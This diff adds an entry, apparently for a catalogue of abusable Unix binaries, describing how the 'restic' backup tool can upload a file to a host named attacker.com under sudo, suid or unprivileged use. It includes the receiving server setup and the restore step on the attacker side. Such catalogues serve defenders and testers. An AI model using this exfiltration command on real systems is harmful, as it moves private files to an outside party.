@@ -1,0 +1,24 @@
+---
+functions:
+  upload:
+  - code: |-
+      restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver:
+      comment: |-
+        The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository use:
+
+        ```
+        rest-server --listen :12345
+        restic init -r rest:http://localhost:12345/x
+        ```
+
+        After the command executed on the target, to extract the data from the restic repository in the current directory on the attacker side:
+
+        ```
+        restic restore -r /tmp/restic/x latest --target .
+        ```
+...
